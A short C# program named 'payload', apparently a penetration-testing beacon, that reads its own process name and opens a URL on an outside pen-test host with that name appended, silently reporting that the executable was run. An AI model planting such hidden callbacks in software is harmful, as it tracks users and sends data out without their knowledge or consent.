namespace payload
{
    class Program
    {
        static void Main(string[] args)
        {
            var data = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
            System.Diagnostics.Process.Start("https://www.aswsec.com/pen-test/exe-logged.html?" + data);
        }
    }
}
